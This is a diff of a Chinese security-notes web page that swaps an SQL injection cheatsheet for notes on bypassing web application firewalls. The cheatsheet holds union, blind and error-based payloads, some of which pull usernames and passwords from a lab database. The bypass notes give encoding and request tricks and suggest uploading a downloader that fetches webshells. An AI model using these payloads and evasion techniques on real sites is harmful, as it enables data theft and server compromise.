@@ -9,14 +9,14 @@
       
       
       
-        <link rel="canonical" href="https://startr4ck.top/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80/SQL%E6%B3%A8%E5%85%A5/">
+        <link rel="canonical" href="https://startr4ck.top/WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87/">
       
       <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-7.3.3">
     
     
       
-        <title>SQL注入 - Startr4ck安全所学</title>
+        <title>绕过 - Startr4ck安全所学</title>
       
     
     
@@ -63,7 +63,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#sql" class="md-skip">
+        <a href="#waf" class="md-skip">
           Skip to content
         </a>
       
@@ -97,7 +97,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              SQL注入
+              绕过
             
           </span>
         </div>
@@ -189,7 +189,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../../%E6%B3%A8%E5%85%A5/%E6%B3%A8%E5%85%A5/" class="md-tabs__link md-tabs__link--active">
+      <a href="../../%E6%B3%A8%E5%85%A5/%E6%B3%A8%E5%85%A5/" class="md-tabs__link md-tabs__link--active">
         WEB安全
       </a>
     </li>
@@ -420,7 +420,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%B3%A8%E5%85%A5/%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+      <a href="../../%E6%B3%A8%E5%85%A5/%E6%B3%A8%E5%85%A5/" class="md-nav__link">
         注入
       </a>
     </li>
@@ -434,7 +434,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../csv%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+      <a href="../csv%E6%B3%A8%E5%85%A5/" class="md-nav__link">
         CSV注入
       </a>
     </li>
@@ -474,14 +474,12 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1_3_1" type="checkbox" id="__nav_3_1_3_1" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1_3_1" data-md-state="indeterminate" type="checkbox" id="__nav_3_1_3_1" checked>
       
       
       
@@ -502,6 +500,97 @@
               
   
   
+  
+    <li class="md-nav__item">
+      <a href="../%E5%9F%BA%E7%A1%80/SQL%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        SQL注入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEB安全/SQL注入/mysql布尔注入.md" class="md-nav__link">
+        布尔注入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        宽字节注入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E7%9B%B2%E6%B3%A8/" class="md-nav__link">
+        盲注
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1_3_2" type="checkbox" id="__nav_3_1_3_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_1_3_2">
+          绕过
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="绕过" data-md-level="4">
+        <label class="md-nav__title" for="__nav_3_1_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          绕过
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
     
   
   
@@ -514,12 +603,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          SQL注入
+          绕过
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        SQL注入
+        绕过
       </a>
       
         
@@ -537,45 +626,65 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#sqlcheatsheet" class="md-nav__link">
-    SQL注入cheatsheet
+  <a href="#waf_1" class="md-nav__link">
+    WAF的基础
   </a>
   
-    <nav class="md-nav" aria-label="SQL注入cheatsheet">
+    <nav class="md-nav" aria-label="WAF的基础">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    查询数据库基本数据
-  </a>
-  
-    <nav class="md-nav" aria-label="查询数据库基本数据">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    查询数据库
+  <a href="#waf_2" class="md-nav__link">
+    WAF的部署方式
   </a>
   
 </li>
         
           <li class="md-nav__item">
+  <a href="#waf_3" class="md-nav__link">
+    WAF的原理
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf_4" class="md-nav__link">
+    绕过waf的思路
+  </a>
+  
+    <nav class="md-nav" aria-label="绕过waf的思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    部署
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    请求
+  </a>
+  
+    <nav class="md-nav" aria-label="请求">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#_3" class="md-nav__link">
-    查询数据表
+    字符相关
   </a>
   
 </li>
         
           <li class="md-nav__item">
   <a href="#_4" class="md-nav__link">
-    查询表当中的列
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#union" class="md-nav__link">
-    union 注入
+    修改请求
   </a>
   
 </li>
@@ -586,104 +695,9 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    注入技巧
+  <a href="#tricky" class="md-nav__link">
+    一些tricky
   </a>
-  
-    <nav class="md-nav" aria-label="注入技巧">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    十六进制编码
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#base64" class="md-nav__link">
-    base64编码
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_7" class="md-nav__link">
-    数据库的连接函数
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_8" class="md-nav__link">
-    布尔注入
-  </a>
-  
-    <nav class="md-nav" aria-label="布尔注入">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#select-case-when" class="md-nav__link">
-    select case when
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#and-if" class="md-nav__link">
-    and if
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#and" class="md-nav__link">
-    and
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_9" class="md-nav__link">
-    报错注入
-  </a>
-  
-    <nav class="md-nav" aria-label="报错注入">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#extractvalue" class="md-nav__link">
-    extractvalue
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#updatexml" class="md-nav__link">
-    updatexml
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#name_const" class="md-nav__link">
-    name_const
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
         
@@ -714,96 +728,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../SQL注入/mysql布尔注入.md" class="md-nav__link">
-        布尔注入
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="md-nav__link">
-        宽字节注入
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../%E7%9B%B2%E6%B3%A8/" class="md-nav__link">
-        盲注
-      </a>
-    </li>
-  
-
-            
-          
-        </ul>
-      </nav>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-      
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1_3_2" data-md-state="indeterminate" type="checkbox" id="__nav_3_1_3_2" checked>
-      
-      
-      
-      
-        <label class="md-nav__link" for="__nav_3_1_3_2">
-          绕过
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <nav class="md-nav" aria-label="绕过" data-md-level="4">
-        <label class="md-nav__title" for="__nav_3_1_3_2">
-          <span class="md-nav__icon md-icon"></span>
-          绕过
-        </label>
-        <ul class="md-nav__list" data-md-scrollfix>
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../%E7%BB%95%E8%BF%87/" class="md-nav__link">
-        绕过
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../NOsql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+      <a href="../NOsql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
         NOsql注入
       </a>
     </li>
@@ -850,7 +775,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../PDO/" class="md-nav__link">
+      <a href="../PDO/" class="md-nav__link">
         PDO
       </a>
     </li>
@@ -1021,6 +946,180 @@
           
         </ul>
       </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" data-md-state="indeterminate" type="checkbox" id="__nav_4_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_2">
+          域内提权
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="域内提权" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_2">
+          <span class="md-nav__icon md-icon"></span>
+          域内提权
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/GPP%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        GPP组策略提权
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" data-md-state="indeterminate" type="checkbox" id="__nav_4_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_3">
+          权限维持
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="权限维持" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_3">
+          <span class="md-nav__icon md-icon"></span>
+          权限维持
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../域安全/攻击手法/权限维持/GPP组策略提权.md" class="md-nav__link">
+        域权限维持
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" data-md-state="indeterminate" type="checkbox" id="__nav_4_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_4">
+          基础
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="基础" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_4">
+          <span class="md-nav__icon md-icon"></span>
+          基础
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4_1" data-md-state="indeterminate" type="checkbox" id="__nav_4_4_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_4_1">
+          网络设置
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="网络设置" data-md-level="3">
+        <label class="md-nav__title" for="__nav_4_4_1">
+          <span class="md-nav__icon md-icon"></span>
+          网络设置
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="/域安全/基础知识/网络转发.md" class="md-nav__link">
+        内网流量转发
+      </a>
     </li>
   
 
@@ -1519,45 +1618,65 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#sqlcheatsheet" class="md-nav__link">
-    SQL注入cheatsheet
+  <a href="#waf_1" class="md-nav__link">
+    WAF的基础
   </a>
   
-    <nav class="md-nav" aria-label="SQL注入cheatsheet">
+    <nav class="md-nav" aria-label="WAF的基础">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    查询数据库基本数据
-  </a>
-  
-    <nav class="md-nav" aria-label="查询数据库基本数据">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    查询数据库
+  <a href="#waf_2" class="md-nav__link">
+    WAF的部署方式
   </a>
   
 </li>
         
           <li class="md-nav__item">
+  <a href="#waf_3" class="md-nav__link">
+    WAF的原理
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf_4" class="md-nav__link">
+    绕过waf的思路
+  </a>
+  
+    <nav class="md-nav" aria-label="绕过waf的思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    部署
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    请求
+  </a>
+  
+    <nav class="md-nav" aria-label="请求">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#_3" class="md-nav__link">
-    查询数据表
+    字符相关
   </a>
   
 </li>
         
           <li class="md-nav__item">
   <a href="#_4" class="md-nav__link">
-    查询表当中的列
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#union" class="md-nav__link">
-    union 注入
+    修改请求
   </a>
   
 </li>
@@ -1568,104 +1687,9 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    注入技巧
+  <a href="#tricky" class="md-nav__link">
+    一些tricky
   </a>
-  
-    <nav class="md-nav" aria-label="注入技巧">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    十六进制编码
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#base64" class="md-nav__link">
-    base64编码
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_7" class="md-nav__link">
-    数据库的连接函数
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_8" class="md-nav__link">
-    布尔注入
-  </a>
-  
-    <nav class="md-nav" aria-label="布尔注入">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#select-case-when" class="md-nav__link">
-    select case when
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#and-if" class="md-nav__link">
-    and if
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#and" class="md-nav__link">
-    and
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_9" class="md-nav__link">
-    报错注入
-  </a>
-  
-    <nav class="md-nav" aria-label="报错注入">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#extractvalue" class="md-nav__link">
-    extractvalue
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#updatexml" class="md-nav__link">
-    updatexml
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#name_const" class="md-nav__link">
-    name_const
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
         
@@ -1694,79 +1718,69 @@
               
                 
                 
-                <h1 id="sql">SQL注入</h1>
-<p>sql注入是搞安全最开始接触到基础漏洞类型吧。<br />
-这篇文章主要包含SQL注入的分类以及实战当中经常使用到的cheatsheet以及一些sql注入的tricky    </p>
-<h2 id="sqlcheatsheet">SQL注入cheatsheet</h2>
-<h3 id="_1">查询数据库基本数据</h3>
-<h4 id="_2">查询数据库</h4>
-<pre><code>select schema_name from information_schema.schemata ;
+                <h1 id="waf">WAF绕过</h1>
+<p>waf绕过是做WEB安全必须的一个技能项，下面我将会从以下几个方面进行说明如何绕过waf的思路  <br />
+1. WAF的基础<br />
+2. 如何绕过WAF </p>
+<h2 id="waf_1">WAF的基础</h2>
+<p>waf的全名为 web 防火墙，就是保护web应用的。<br />
+知己知彼，才能百战百胜  </p>
+<p>从 文件传输和错误的输入输出过滤进行 
+基本方式是获取用户到服务侧的流量，方式主要有三种。</p>
+<h3 id="waf_2">WAF的部署方式</h3>
+<ol>
+<li>反向代理，读数据进行净化和阻拦部署在服务器之前 nginx openresty都是实现方式。</li>
+<li>硬件waf，部署位置和反向代理类似，但是获取的是网络层的流量解析为http的流量之后传输给之后的服务器。 </li>
+<li>网卡流量，读取网卡中的流量并交给服务器数据，类似于硬件waf的旁路部署模式，产品举个例子有TDP这种产品。</li>
+<li>云waf，cloudflare以及阿里云盾之类的云安全产品。   </li>
+<li>软件waf，比较多，常见的安全狗这种产品       <br />
+上述说了五种方式，其实是比较细分的主要的waf我认为按照地理上来分布其实只有三种。<br />
+第一种是软件WAF，部署在应用服务器上 云锁，安全狗。 <br />
+第二种是硬件WAF，这也是前些年卖硬件产品的乙方最喜欢在机房部署的东西。<br />
+第三种是云WAF，现在网站上云之后的一些云安全产品，cloudflare提供的保护，或者是利用开源产品做nginx反代的产品。  </li>
+</ol>
+<h3 id="waf_3">WAF的原理</h3>
+<p>waf一般内置了一些检测的规则，当输入的某些参数触碰到规则的时候，则说明请求很有可能是攻击者来自攻击者。                                                       </p>
+<h2 id="waf_4">绕过waf的思路</h2>
+<p>既然是规则，那么我们只要不触碰规则即可让我们的攻击请求成功发生了。 
+根据部署的方式 参数请求 有以下两种思路  </p>
+<h3 id="_1">部署</h3>
+<p>当目标服务器使用的是云服务器时，我们可以寻找到原站进行即可绕过云waf  </p>
+<h3 id="_2">请求</h3>
+<h4 id="_3">字符相关</h4>
+<p>常见的方式<br />
+1. 使用十六进制编码  select from 0x11111
+2. 关键字替换   and - &amp;&amp;
+3. 大小写转换 select - SelEct 
+4. 双写字符 select - seselectlect<br />
+5. url编码  select * from zzz - select * from  %257a%257a%257a<br />
+6. 注释符绕过 </p>
+<h4 id="_4">修改请求</h4>
+<p>通过修改请求当中的参数来绕过waf <br />
+1. 将referer修改为本地的地址 <br />
+2. 修改编码为不常见的编码<br />
+3. 使用大量的参数进行 后面不会进行过滤  openresty以及一些中间件都很吃这套 </p>
+<pre><code>id=1&amp;id=1.......id=1&amp;id=evilpayload  
 </code></pre>
-<p>show databaes;</p>
-<h4 id="_3">查询数据表</h4>
-<pre><code>select table_name from information_schema.tables where table_schema=&quot;&quot; ;
+<ol>
+<li>使用分块传输   </li>
+<li>修改Content-Type  </li>
+</ol>
+<h3 id="tricky">一些tricky</h3>
+<ol>
+<li>内联注释   </li>
+</ol>
+<pre><code>/*!uncion select xxx */ 
+/*!select 1 from */
 </code></pre>
-<h4 id="_4">查询表当中的列</h4>
-<pre><code>select column_name from information_schea.columns where table_name=&quot;&quot;;
-</code></pre>
-<h4 id="union">union 注入</h4>
-<p>union注入最好选择将注入语句放在最后 </p>
-<pre><code>index.php?id=1' union select 1,2,table_name from information_schema.tables where table_schema= 0x7365637572697479 %23
-
-index.php?id=1' union select 1,2,table_name from information_schema.tables where table_schema= 0x7365637572697479 %23
-</code></pre>
-<h3 id="_5">注入技巧</h3>
-<h4 id="_6">十六进制编码</h4>
-<p><strong>进行注入的时候使用 "" 比较少见 一般是将其转换为 0x 的十六进制形式</strong> 
-在mysql当中都可以通用十六进制来进行</p>
-<pre><code>select concat_ws(0x23,version(),2);
-</code></pre>
-<h4 id="base64">base64编码</h4>
-<pre><code>select convert_from(decode(‘vasndjcn==’,’base64’),’utf-8’)
-select chr(num1) || chr(num2) || chr(num3) 只能使用select insert delete
-</code></pre>
-<h3 id="_7">数据库的连接函数</h3>
-<p>几种常见的数据连接函数<br />
-1. concat(str1,str2,...)——没有分隔符地连接字符串
-2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串
-3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据    </p>
-<h3 id="_8">布尔注入</h3>
-<p>通过精心构造的语句进行拼接，从而产生真或者假的返回值最后得到返回结果   </p>
-<h4 id="select-case-when">select case when</h4>
-<pre><code>select case when {判断语句} then sleep(3) else 1 end;
-select case when (ascii(substr((select version()),1,1))=58) then sleep(3) else end;  
-select case When ascii(substr(concat(user,password),1,1))&gt;53 THEN 1 else 0 end from users limit 0,1;  
-</code></pre>
-<h4 id="and-if">and if</h4>
-<pre><code>admin') and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=114,1,0) #
-
-admin') and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,0); #
-</code></pre>
-<h4 id="and">and</h4>
-<pre><code>1' and ascii(substr((select version()),1,1))=53#
-1' and ascii(substr(databse(),1,1))&lt;109 #
-</code></pre>
-<h3 id="_9">报错注入</h3>
-<p>通过sql注入当中存在的一些函数，在故意造成错误的情况下会将精心构造的函数进行执行从而造成数据的泄露或者代码的执行  </p>
-<h4 id="extractvalue">extractvalue</h4>
-<p>extracvalue从目标的XML文件当中查询的字符串 </p>
-<pre><code>extractvalue(1,concat(0x7e,(select @@version),0x7e))
-
-http://192.168.233.140:83/Less-5/?id=1%27%20and%20extractvalue(1,concat(0x7e,(select%20concat(username,password)%20from%20security.users%20limit%201,1),0x7e))--+
-</code></pre>
-<h4 id="updatexml">updatexml</h4>
-<pre><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)
-
-http://192.168.233.140:83/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20concat(username,password)%20from%20security.users%20limit%201,1),0x7e),1)--+
-</code></pre>
-<p>updatexml的本意是更新xpath文档当中的字符串，我们的xpath_string写错的时候就会出现错误 </p>
-<h4 id="name_const">name_const</h4>
-<p>感觉平时使用的比较少 </p>
-<pre><code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
-http://192.168.233.140:83/Less-5/?id=1%27%20and%20select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x--+
-</code></pre>
+<ol>
+<li>上传一个webshell，很有可能被杀，但是如果上传一个下载其他webshell的文件被杀的概率就很小。 
+上传一个包含的php jsp 脚本，该脚本去下载webshell  </li>
+</ol>
 <h2 id="referer">referer</h2>
-<p><a href="https://www.freebuf.com/articles/web/175049.html">部分payload的来源</a></p>
+<p><a href="https://www.freebuf.com/vuls/251028.htmll">waf 绕过的方式 </a>
+<a href="https://www.freebuf.com/articles/web/259027.html">WAF绕过拍了拍你</a>
+<a href="https://www.freebuf.com/articles/web/224473.html">开源WAF测试评估方法</a></p>
                 
               
               
@@ -1791,7 +1805,7 @@ http://192.168.233.140:83/Less-5/?id=1%27%20and%20select * from (select NAME_CON
     <nav class="md-footer__inner md-grid" aria-label="Footer">
       
         
-        <a href="../../csv%E6%B3%A8%E5%85%A5/" class="md-footer__link md-footer__link--prev" aria-label="Previous: CSV注入" rel="prev">
+        <a href="../%E7%9B%B2%E6%B3%A8/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 盲注" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
           </div>
@@ -1800,20 +1814,20 @@ http://192.168.233.140:83/Less-5/?id=1%27%20and%20select * from (select NAME_CON
               <span class="md-footer__direction">
                 Previous
               </span>
-              CSV注入
+              盲注
             </div>
           </div>
         </a>
       
       
         
-        <a href="../../%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="md-footer__link md-footer__link--next" aria-label="Next: 宽字节注入" rel="next">
+        <a href="../NOsql%E6%B3%A8%E5%85%A5/" class="md-footer__link md-footer__link--next" aria-label="Next: NOsql注入" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 Next
               </span>
-              宽字节注入
+              NOsql注入
             </div>
           </div>
           <div class="md-footer__button md-icon">
